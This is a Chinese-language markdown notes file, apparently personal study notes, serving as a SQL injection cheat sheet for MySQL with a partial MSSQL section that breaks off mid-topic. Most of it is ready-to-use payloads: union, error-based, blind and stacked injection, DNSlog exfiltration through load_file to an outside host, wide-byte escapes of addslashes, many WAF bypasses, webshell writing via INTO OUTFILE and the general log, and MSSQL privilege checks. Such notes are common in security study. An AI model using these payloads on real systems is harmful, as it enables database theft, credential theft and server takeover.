---
date: 2025-01-15
---

# mysql

## 概述

* 原理：

web应用没有对用户传递的参数严格筛查，构造特殊语句对数据库经行操作。

* 手法分类：

* 按查询手段：字符型，数字型
* 按注入方法：union注入，报错注入，布尔注入，时间注入

## 信息

| 查询语句                               |          |
| -------------------------------------- | -------- |
| select user()<br />select current_user | 当前用户 |
|                                        |          |



* 当前用户
  
  current user() 可看权限
  
* 权限
  show grants
  
* 所有用户
  SELECT User, Host FROM mysql.user;
  
* 版本
  version()

* 路径
  @@datadir

* 操作系统版本

  @@version_conplie_os

## 类型判断：

1. ##### 判断是字符型还是数字型

   1. 数字判断；

      * 先输入?id=2，再输入id=2-1.页面不会改变:字符型

      * 先输入?id=1 and 1=1 ,再输入?id=1 and 1=2.页面不变，字符型

   2. sleep+if (适用页面回显有限)

   * 直接插入and if(1=1,sleep(3),sleep(0))字符型：秒相应。

2. ##### 如果字符型：

   * 判断回环方式：常见回环有 ‘   “  ”） ’）'))。
     * 一个一个试，报错的就是那个闭环,
     * if(1,sleep(3),sleep(0))
       * 在上一步判断的基础上 注释掉后面，再试回环方式，延迟的就是那个。
   * 注释掉：--+，%23 ，

3. 然后判断是哪钟注入方式，用and，union连接前后，如果使用union，必须要知道列数

***

## 可用的库/表

* 
information_schema

| 表          | 说明                   | 列                                             |
| ---------- | -------------------- | --------------------------------------------- |
| columns    | 存储列<br />**获取列名**    | table_schema<br />table_name<br />column_name |
| partitions | 表的分区信息<br />**获取表名** | table_schema<br />table_name                  |
| tables     |                      |                                               |

  

* sys

| 库   | 表   | 列   |
| ---- | ---- | ---- |
|      |      |      |

* performance_schema

| 表               | 说明     | 列                                       |
| ---------------- | -------- | ---------------------------------------- |
| table_handles    | 表句柄   | object_schema 库名<br />object_name 表名 |
| global_bariables | 全局变量 | variable_name<br />variable_value        |

## Union注入：

1. 查询列数，union语句查询的列数必须相同。

   * ##### 获取列数：

     * id=1' order by 1/2/  --+(试出列数)
     * id =1' group   by 数字  可以用二分法。

1.  查找回显位：

   * id = -1 ' union select 1,2,3 --+ 

1.  拿库/表/列名：

   * 获取当前库：<u>id=-1(一个不存在的id，防止占显示位)</u> union select 1，2，database（）--+   让data函数在回显位上

   * 所有库：id=-1' union select 1,(select group_concat(schema_name) form information_schema.schemata),3 --+

   * 所有表：id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+   table_schema是储存表的库名。where限定当前数据库。

1.  查询某个库某个表的列名：

id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='表名'(这里不加引号会出错，会把这个当成列名) --+

columns表中数据多，用table_schema=限制库，table_name='' 限制表

5.  拿数据：

id=-1' union select 1,2,group_concat(字段1 ，....) ,3 from 表名。

***

## 报错注入：

让报错信息中显示想要的信息 。有时候没有回显，但错误信息可以回显。

### extractvalue()/updatexml()

extractvalue()使用：

```sql
extractralue(xml_fragment,xpath)

```

当path格式出错会返回错误。

```sql
and extractvalue(1,concat(0x7e,sql语句))) #由于xpath的格式，不能用group_concat
```

extractvalue只会返回32个字符，所有要用substring,控制显示的范围

* substring(string,num1,num2):  
  * num1：从第几个字符开始...num2：回显多少个(在这里，超过32的还是不会显示)

* limit x,1

完善：

```sql
and extractvalue(1,concat(0x7e,substring(sql语句,从哪里，多少个)))
```

2. updatexml()和extractvalue()使用相似，只是参数不同：

   ```sql
   updatexml(1,sql语句,2)
   ```

   

### floor() 

* --floor()向下取整。count(*)记数,rand()产生随机数。
  
  --floor(rand()\*2)的顺序是固定的**0110110011**
  
  ```sql
  select rand()*2 from inforamtion_schema.tables;
  ```
  
  --当coun(*)和order或group 连用。会创建一个虚拟表。根据键统计。
  
  > group by(floor(rand()\*2)) 和 select\*
  > (floor(2\*rand())
  >
  > 1. 执行select时，发现是0，表里没有，需要插入，但是group时，会再次计算，结果是1，实际插入1
  > 2. 再次时，select是1，直接加一，
  > 3. 然后第三条数据，select是0，表里没有，插入，group执行，是1，实际插入1，那么表里就有两个1，报错
  
  就要执行足够多，至少三个数据，就会报错，还是就是rand的伪随机种子也会影响
  
  
  
  * 用concat把注入和报错语句链接

```sql
select count(*),floor(rand(0)*2) from information_schema.columns group by floor(rand(0)*2);
原理：错误返回key‘1’重复，把sql语句和key值链接起来：
select count(*),concat(sql语句,0x7e,floor(rand(0)*2)) from table_name group by concat(sql语句,07xe,floor(rand(0)*2));
可以用 as 为foor(rand(0)*2) 取别名 a,在 group by 用别名代替key

tips:count(*)占一个列数
```

* 例子：sql-labs-6

  ```sql
  union select null, count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2))a from information_schema.tables  group by a
  ```

  

### exp

exp(x)用于计算 e的x次方。这个极限是x=709，大于709，会爆出一个溢出的错误。 
`~` 运算符按位取反的方式得到一个大值，可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围。
```sql
select exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x));
```

### geometry

mysql中支持集合类型：Point，LineString()等：

```
Point(1,1)
```

```sql
ST_GeomFromText()
ST_Contains()
ST_Distance()
ST_AsText()
```

```sql
select geometrycollection((select * from(select database())a));
select multipoint((select * from(select user())a));
select polygon((select * from(select version())a));
```

### json报错



***



## 布尔盲注：

* 适用：页面只有真和假两种状态。用1=1，1=2检测

*  原理：根据页面返回的真和假来判断注入语句的真假；

  ```sql
  and substring(sql语句，1,1)>'s'  //根据真假推断字母
  将字母转为ascii码方便查找：
  and ascii(substring(sql语句,1,1))>100
  ```

***

## 时间盲注：
### sleep

* 适用：什么信息也不会回显，改变；
* 原理：根据响应时间判断字母；
* 关键函数：
  * sleep()，
  * if(1,2,3)：1成立：执行2，反之执行3；
* 过程：
  * 判断注入点：
  * 用length()判断长度
  * 字符枚举


```sql
if((ascii(substring((select database()),1,1))>1),sleep(0),sleep(3))
```


### BENCHMARK() 
### 复杂计算嵌套
### 正则
### 子查询

** *

## 堆叠注入

* 用；链接sql语句 。


***

## DNSlog外带注入

[DNSlong](http://www.dnslog.cn/)

* 条件

  > 是windows
  > 允许load_file()。secure_file_priv=""
  > roo权限
  > mysql能联网


> load_file()要求必须是绝对路径，要用//。
> sql向 `//sql_str.xxx.dnslog/1.txt`发出请求，

```mysql
select load_file(concat('//',(sql_str),'.xxx.dnslog/1.txt'));
```

***

## 宽字节注入

> gbk编码一个中文2个bytes
> utf-8编码一个中文3个bytes

gbk是占用两个字节的编码，对ascii有兼容，把两个16进制 看作一个还是两个字符，由高字节确定

* 0-127是正常的ascii，%7e\ 7e 小于127，gbk会把他当作两个字符。
* 如果是大于127情况，表示超出了ascii的范围，
高字节：0x81 - 0xFE 低字节：0x40 - 0xFE

> 当数据库使用gbk编码，会判断连续的两个字节的高字节是否大于128。是的话会把这两个字节
> 作为一个整体，
> 从而达到一些绕过(addslashes,)
> 只需要在需要绕过的符号前面加上 十进制大于128的 url编码,

* 而对于gb2312，gbk的前身。
  对于两个字节(第一字节高位，第二字节是低位)，有要求，低位`0xA1~0xFE`。而gbk`0x40 ~ 0xFE`，单引号是 0x5c，不在gb2312中，所以在吃掉\时，0x5c不会作为gb2312的低位进行编码，无法绕过。

***

## 二次注入

> 会把特殊字符转义，无法直接注入。但是将脏语句存进数据库。

* 登录界面

  ```sql
  SELECT * FROM users WHERE username = '输入的用户名' AND password = '输入的密码';
  ```
  
  如果为真，就成功。
  
* 一次注入
  如果注册一个 admin '#。数据库中存储admin '#这个用户

* 二次注入
  当登录admin'#时，登录逻辑会把比对password注释。那么就相当于执行

  ```sql
  select * from user where username='admin' # and pass=***''
  ```

  那么就返回true，登录到admin了

***

## 伪静态注入

> 伪造的静态页面，利用url重写，去掉了?id=等明显的参数传递。

* 判断:

  控制台：alert(document.lastModified)
  如果时间一样，就是伪静态

***

## header注入

开发者很多时候会这样写：

```php
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO logs (ua) VALUES ('$user_agent')";
```

记录用户的IP，USER-AGENT，Referer，Cookie

***

## cookie

需要有cookie



## waf绕过


> 使用join函数

### 空格绕过

用其它字符/编码代替空格：

* %20(空格) %09(tab 水平制表符) %0b(tab 垂直制表符) %0c(换页) %0d %a0(空格) 
* 注释
  --+  # 单行注释
  /* */ 多行注释
  /\*! \*/ 内联注释 ，多行，但是里面的会执行

### 大小写绕过

**mysql**是不区分大小写的

### null绕过

mysql中,\N等价null

```mysql
select * from user where id=\N union...
```



### 等价函数绕过

* union  select
  union distinct

* substr
  mid
  substring
  stbstrB

  left

* concat
  group_concat
  concat_ws

* char
  hex
  unhex

### 浮点数绕过
f
可以用浮点数。向下取整。：1e0

### NULL值绕过

where id=\N

### 添加库名绕过

waf可能不会拦截 schema.table格式。

```sql
select * from user 等价
select * from securi.user
```

### orderby绕过

```mysql
select * from users where id=1 into @a,@b,@c,@d;
#将查询的值放到 变量中
```

### 16进制绕过

字段可以用16进制

```mysql
select * from 
```



### 双写绕过

利用distinct关键字去除查询的重复值，从而绕过

```sql
select * from users where id=-1 union distinct select 1,2,version() from users
```



### 反引号绕过

在mysql可以使用反引号绕过一些waf，填不添加反引号意义相同

```sql
select * from  `table_name`
```

### 逗号绕过

join:

```mysql
where id = \N UNION SELECT * FROM ((SELECT 1) AS a join (SELECT 2) AS b join (SELECT 3) AS c)

#或者有些版本省略as
select * from ((select 1)a join (select 2)b join (select 3)c);
```

from ..for

```mysql
#str from .for..
select SUBSTRING((database()) FROM 1 FOR 2);

```

limit ..offset..

```mysql
#limit 
selet * from user limit 2 offset 1 #从偏移量1(行数)开始，取2两行
#等价 select * from user limit 1,2
```

[case when..then..end](###IF绕过)

见if绕过

### 脚本语言特性

如：在php中，id=1&id=2.会自动覆盖前面的值。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c4e8fe5ab5f4fec8cfc1b1740662c46.png)

### join绕过

使用 join 自连接两个表 ;
 union select 1,2 # 等价于 union select * from (select 1)a join (select 2)b
 \#a 和 b 分别是表的别名；
 select * from users where id=-1 union select 1,2,3; # 可以变成下面的语句；
 select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c;
 select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c;

### like模糊绕过

用模糊查询 select user()like '%r%'

### or & xor&not 绕过

and=&&
or = ||
not=！
xor=|

### =绕过

使用like rlike regexp  或者 > 或者<

```mysql
select * from (select 1)as a where database() like "d%";
```




### addslashes绕过

> addlashes()会在特殊字符前面加上 \ ，从而使字符只是一个字符。'  -> \\'。那么字符型注入就不能添加'闭合。

* 宽字节编码吃掉 \

  > mysql使用gbk编码，会判断前一个字节ascii是否大于128，如?id=%df%27
  > 这里是url编码，字符的ascii前面加上%的十六进制形式。df大于128。所以addslashes添加的\会和%df作为整体，进行汉字编码，那么%27 (就是')就逃逸了，从而达到闭合

### 预编译

>  Prapared Statement
>
>  就是一个sql语句，但是参数是一个占位符**？**，没有实际的参数。先预先看这个sql语句，当参数进来时，能快速执行

* mysql

  ```mysql
  prepare statement_name from "sql"; /*准备*/
  set @id=1;  /*设置参数*/
  execute statement_name using @id;
  /*参数和准备没有先后*/
  ```

  ```sql
  set @sql=concat('sele','ct* from `1919810931114514`;');
  prepare stmt from @sql;
  execute stmt;
  ```


### handler

> 可以充当select的作用

* handler table_name open;
  打开句柄
* handler table_name read [first/next]
  获取信息

### collation冲突

union select 查询时，会进行规则校对(collation)，比如前面使用utf8_general_ci，后面使用utf8_unicode_ci，不兼容，拼接查询结果时就会冲突。

* 解决：
  将其中一方进行hex()

### IF绕过

使用case when ..then ... else... end

```sql
case when ascii(length(substr()))>97 then sleep(3) else 0 end
```

### 分块传输绕过

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked
23
This is the data in the first chunk\r\n
1A
and this is the second one\r\n
3
con
8
sequence\r\n
```

## 常用手法
```mysql
mid(user()from(2)for(1))
select(group_concat(username,passwoorrd))from`users`
```

***

## 写马

### 文件写

> my.ini文件配置：
> secure_file_priv=  没有对文件进出做限制
> secure_file_priv=dir  对文件路径限制
> secure_file_priv=null  无法读取或导入文件

权限查看用```show global variables like '%secure%';```
==在sql8.0后，information_schema不支持 global_variables==,使用perfomanc_schema

```php
?id=-1' union select 2,(select group_concat(VARIABLE_NAME,":",VARIABLE_VALUE) from information_schema.GLOBAL_VARIABLES where VARIABLE_NAME LIKE "%secure%"),3
```

读取：load_file()
```sql
?id=-1' union select 2,load_file("file_path"),3
```

写入：into outfile/dumpfile

* outfile不能写入已经存在的文件

```php
?id=-1' union select 2,3,"<php phpinfo(); ?>" into outfile "file_path"	
```

* 读文件只能用/
  写文件可以用 /  或者 \\\\两个 \，因为使用反斜杠时，mysql会去除一个

### 日志写马

> general_log=on  开启日志功能，查询都会记录
> general_log_file="path"  日志将会在这里

* 查询：show global variables like "%general%"
* 开启log： set GLOBAL general_log='ON';
* log路径：set GLOBAL general_log_file="path";
* 写马：select "<?php phpinfo(); ?>" 



***

## tips：

* +号有时会理解为空格，注入时，空格被拦截，可以用+代替
* 



## 线上waf

http://www.e-ande.com/
http://www.ahjgjz.com/

# MSSQL

[参考](https://cloud.tencent.com/developer/article/2204665)

microsoft的sql server。默认端口1433

## 基础

有6个数据库：master，model，msdb，tempdb。以及两个实例数据库：ReportServer，ReportServerTempDB。

系统表：每个数据库至少有一个系统表。系统存储当前数据库的表信息。新版叫sys.objects。旧版叫sysobjects
xtype：系统表记录表的类型，U：用户表(一般的表)，V：视图，P：存储过程

> 权限/角色：

sql server 大致有三类角色:

* 服务器级别
  sysadmin：读写所有表，能执行xp_cmdshell ""
  serveradmin：配置sqlserver服务器
  securityadmin：创建登录，分配权限
  setupadmin：管理连接服务器
  diskadmin：管理磁盘
  bulkadmin：文件读写
* 数据库级别
  db_owner：对当前数据库完全控制
  public：
* 对象级别

> 重要的库/表：

* master
  

## 信息搜集

* 判断数据库类型

  ```
  ?id=1 and (select count(*) from sysobjects)>0 --  //如果页面返回正常即可表示为 MSSQL 数据库
  ?id=1;WAITFOR DELAY '00:00:10'; --
  ```

* 基础

  ```mssql
  @@version() //版本
  select system_user;   //当前用户
  and user >0            //获取当前数据库用户名
  and db_name>0    //获取当前数据库名称
  select * from sys.server_principals; #所有服务器角色
  select * from fn_my_permissions(NULL, 'SERVER');  //当前权限
  ?id=1 and ((select host_name())=(select @@servername))--   //是否站库分离
  ```

* 判断服务器角色：

  ```mssql
  ?id=1 and 1=(select is_srvrolemember('sysadmin'))--
  ?id=1 and 1=(select is_srvrolemember('serveradmin'))--
  ?id=1 and 1=(select is_srvrolemember('securityadmin'))--
  ?id=1 and 1=(select is_srvrolemember('processadmin'))--
  ?id=1 and 1=(select is_srvrolemember('setupadmin'))--
  ?id=1 and 1=(select is_srvrolemember('bulkadmin'))--
  ?id=1 and 1=(select is_srvrolemember('diskadmin'))--
  ?id=1 and 1=(select is_srvrolemember('dbcreator'))--
  ?id=1 and 1=(select is_srvrolemember('public'))--
  ```

* 判断数据库角色：

  ```mssql
  ?id=1 and 1=(select IS_ROLEMEMBER('db_owner'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_securityadmin'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_accessadmin'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_backupoperator'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_ddladmin'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_datawriter'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_datareader'))--
  ?id=1 and 1=(select IS_ROLEMEMBER('db_denydatawriter'))--
  ```

## 报错注入

### 类型错误

mssql是强类型的，类型不一致会报错



